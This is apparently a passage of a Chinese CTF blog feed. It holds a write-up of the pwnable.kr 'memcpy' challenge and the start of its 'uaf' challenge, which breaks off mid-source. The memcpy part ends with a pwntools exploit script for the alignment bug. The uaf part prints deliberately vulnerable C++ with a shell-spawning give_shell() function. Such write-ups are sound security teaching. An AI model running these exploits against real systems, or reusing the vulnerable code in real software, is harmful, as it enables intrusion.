&lt;h2 id=&quot;ctf-angr&quot;&gt;&lt;a href=&quot;#ctf-angr&quot; class=&quot;headerlink&quot; title=&quot;ctf_angr&quot;&gt;&lt;/a&gt;ctf_angr&lt;/h2&gt;&lt;p&gt;一个用于练习angr的ctf题库，从入门到进阶，同时配</summary>
      
    
    
    
    
    <category term="re" scheme="http://example.com/tags/re/"/>
    
    <category term="angr" scheme="http://example.com/tags/angr/"/>
    
    <category term="符号执行" scheme="http://example.com/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr memcpy</title>
    <link href="http://example.com/2021/02/07/CTF/pwn/pwnable/pwnable.kr-memcpy/"/>
    <id>http://example.com/2021/02/07/CTF/pwn/pwnable/pwnable.kr-memcpy/</id>
    <published>2021-02-07T08:58:17.802Z</published>
    <updated>2021-02-12T12:41:26.357Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210208131853431.png">    </p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// compiled with : gcc -o memcpy memcpy.c -m32 -lm</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">rdtsc</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">&quot;rdtsc&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">slow_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">dest[i] = src[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fast_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="comment">// 64-byte block fast copy</span></span><br><span class="line"><span class="keyword">if</span>(len &gt;= <span class="number">64</span>)&#123;</span><br><span class="line">i = len / <span class="number">64</span>;</span><br><span class="line">len &amp;= (<span class="number">64</span><span class="number">-1</span>);</span><br><span class="line"><span class="keyword">while</span>(i-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">__asm__ __volatile__ (</span><br><span class="line"><span class="string">&quot;movdqa (%0), %%xmm0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 16(%0), %%xmm1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 32(%0), %%xmm2\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 48(%0), %%xmm3\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm0, (%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm1, 16(%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm2, 32(%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm3, 48(%1)\n&quot;</span></span><br><span class="line">::<span class="string">&quot;r&quot;</span>(src),<span class="string">&quot;r&quot;</span>(dest):<span class="string">&quot;memory&quot;</span>);</span><br><span class="line">dest += <span class="number">64</span>;</span><br><span class="line">src += <span class="number">64</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// byte-to-byte slow copy</span></span><br><span class="line"><span class="keyword">if</span>(len) slow_memcpy(dest, src, len);</span><br><span class="line"><span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hey, I have a boring assignment for CS class.. :(\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The assignment is simple.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------------------------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- What is the best implementation of memcpy?        -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- 1. implement your own slow/fast version of memcpy -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- 2. compare them with various size of data         -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- 3. conclude your experiment and submit report     -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------------------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This time, just help me out with my experiment and get flag\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No fancy hacking, I promise :D\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> t1, t2;</span><br><span class="line"><span class="keyword">int</span> e;</span><br><span class="line"><span class="keyword">char</span>* src;</span><br><span class="line"><span class="keyword">char</span>* dest;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> low, high;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line"><span class="comment">// allocate memory</span></span><br><span class="line"><span class="keyword">char</span>* cache1 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">char</span>* cache2 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">src = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> sizes[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// setup experiment parameters</span></span><br><span class="line"><span class="keyword">for</span>(e=<span class="number">4</span>; e&lt;<span class="number">14</span>; e++)&#123;<span class="comment">// 2^13 = 8K</span></span><br><span class="line">low = <span class="built_in">pow</span>(<span class="number">2</span>,e<span class="number">-1</span>);</span><br><span class="line">high = <span class="built_in">pow</span>(<span class="number">2</span>,e);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;specify the memcpy amount between %d ~ %d : &quot;</span>, low, high);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"><span class="keyword">if</span>( size &lt; low || size &gt; high )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;don&#x27;t mess with the experiment.\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">sizes[i++] = size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ok, lets run the experiment with your configuration\n&quot;</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// run experiment</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">size = sizes[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;experiment %d : memcpy with buffer size %d\n&quot;</span>, i+<span class="number">1</span>, size);</span><br><span class="line">dest = <span class="built_in">malloc</span>( size );</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);<span class="comment">// to eliminate cache effect</span></span><br><span class="line">t1 = rdtsc();</span><br><span class="line">slow_memcpy(dest, src, size);<span class="comment">// byte-to-byte memcpy</span></span><br><span class="line">t2 = rdtsc();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ellapsed CPU cycles for slow_memcpy : %llu\n&quot;</span>, t2-t1);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);<span class="comment">// to eliminate cache effect</span></span><br><span class="line">t1 = rdtsc();</span><br><span class="line">fast_memcpy(dest, src, size);<span class="comment">// block-to-block memcpy</span></span><br><span class="line">t2 = rdtsc();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ellapsed CPU cycles for fast_memcpy : %llu\n&quot;</span>, t2-t1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;thanks for helping my experiment!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;flag : ----- erased in this source code -----\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h3><ul><li>在申请的内存小于64时，采用的是<code>slow_memcpy</code>逐个字节的复制，没有其他要求，但是速度较慢</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">slow_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">dest[i] = src[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在复制内存大于64个字节时，采用<code>fast_memcpy</code>中的指令复制，复制速度快</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fast_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="comment">// 64-byte block fast copy</span></span><br><span class="line"><span class="keyword">if</span>(len &gt;= <span class="number">64</span>)&#123;</span><br><span class="line">i = len / <span class="number">64</span>;</span><br><span class="line">len &amp;= (<span class="number">64</span><span class="number">-1</span>);</span><br><span class="line"><span class="keyword">while</span>(i-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">__asm__ __volatile__ (</span><br><span class="line"><span class="string">&quot;movdqa (%0), %%xmm0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 16(%0), %%xmm1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 32(%0), %%xmm2\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 48(%0), %%xmm3\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm0, (%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm1, 16(%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm2, 32(%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm3, 48(%1)\n&quot;</span></span><br><span class="line">::<span class="string">&quot;r&quot;</span>(src),<span class="string">&quot;r&quot;</span>(dest):<span class="string">&quot;memory&quot;</span>);</span><br><span class="line">dest += <span class="number">64</span>;</span><br><span class="line">src += <span class="number">64</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// byte-to-byte slow copy</span></span><br><span class="line"><span class="keyword">if</span>(len) slow_memcpy(dest, src, len);</span><br><span class="line"><span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用使用指令<code>nc pwnable.kr 9022</code>连接，随便输入了一些值过后发现永远停留在了第四次检测，但是如果在本地输入却可以通过</p><ul><li><p><strong>movdqa</strong>指令</p><p><code>movdqa</code>指令的操作数都要求16字节对齐，在本地可以正常运行时因为malloc本身就是8字节对齐的，加上8个字节的chunk头，malloc返回的指针就已经遵循16字节对齐了，所以随便输入也可以正常运行，但是在靶机上可能是因为Ubuntu版本的问题，chunk在内存中是连续的，而不遵循内存对齐，所以需要我们自己计算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 计算在范围中可输入的数字那些符合要求</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">13</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="number">6</span>:</span><br><span class="line">        chunk_size[i<span class="number">-3</span>].append(pow(<span class="number">2</span>,i))</span><br><span class="line">    <span class="keyword">if</span> i &gt;= <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">for</span> size <span class="keyword">in</span> range(pow(<span class="number">2</span>, i), pow(<span class="number">2</span>, i+<span class="number">1</span>)):</span><br><span class="line">            <span class="keyword">if</span> (size<span class="number">-8</span>)%<span class="number">16</span> == <span class="number">0</span>:</span><br><span class="line">                chunk_size[i<span class="number">-3</span>].append(size)</span><br></pre></td></tr></table></figure></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9022</span>)</span><br><span class="line">chunk_size = [[], [], [], [], [], [], [], [], [], [], []]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">13</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="number">6</span>:</span><br><span class="line">        chunk_size[i<span class="number">-3</span>].append(pow(<span class="number">2</span>,i))</span><br><span class="line">    <span class="keyword">if</span> i &gt;= <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">for</span> size <span class="keyword">in</span> range(pow(<span class="number">2</span>, i), pow(<span class="number">2</span>, i+<span class="number">1</span>)):</span><br><span class="line">            <span class="keyword">if</span> (size<span class="number">-8</span>)%<span class="number">16</span> == <span class="number">0</span>:</span><br><span class="line">                chunk_size[i<span class="number">-3</span>].append(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">13</span>):</span><br><span class="line">    string = <span class="string">&#x27;specify the memcpy amount between &#123;&#125; ~ &#123;&#125; : &#x27;</span>.format(pow(<span class="number">2</span>,i), pow(<span class="number">2</span>,i+<span class="number">1</span>))</span><br><span class="line">    sh.sendlineafter(string, str(chunk_size[i<span class="number">-3</span>][<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">log.success(sh.recv())</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210212203957532.png"></p><ul><li><p>接收</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210212204107864.png"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;&lt;img src=&quot;https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210208131853431.png&quot;&gt;    &lt;/p&gt;
&lt;h3 id=&quot;源码&quot;&gt;&lt;a href=</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/categories/CTF/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/CTF/pwn/pwnable-kr/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr uaf</title>
    <link href="http://example.com/2021/02/05/CTF/pwn/pwnable/pwnable..kr-uaf/"/>
    <id>http://example.com/2021/02/05/CTF/pwn/pwnable/pwnable..kr-uaf/</id>
    <published>2021-02-05T15:33:16.078Z</published>
    <updated>2021-02-08T05:18:08.447Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210208131805440.png"></p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">        <span class="keyword">int</span> age;</span><br><span class="line">        <span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;My name is &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot; years old&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Man(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am a nice guy!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Woman(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am a cute girl!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        Human* m = <span class="keyword">new</span> Man(<span class="string">&quot;Jack&quot;</span>, <span class="number">25</span>);</span><br><span class="line">        Human* w = <span class="keyword">new</span> Woman(<span class="string">&quot;Jill&quot;</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">size_t</span> len;</span><br><span class="line">        <span class="keyword">char</span>* data;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> op;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1. use\n2. after\n3. free\n&quot;</span>;</span><br><span class="line">                <span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">switch</span>(op)&#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                                m-&gt;introduce();</span><br><span class="line">                                w-&gt;introduce();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                                len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">                                data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">                                read(open(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">                                <span 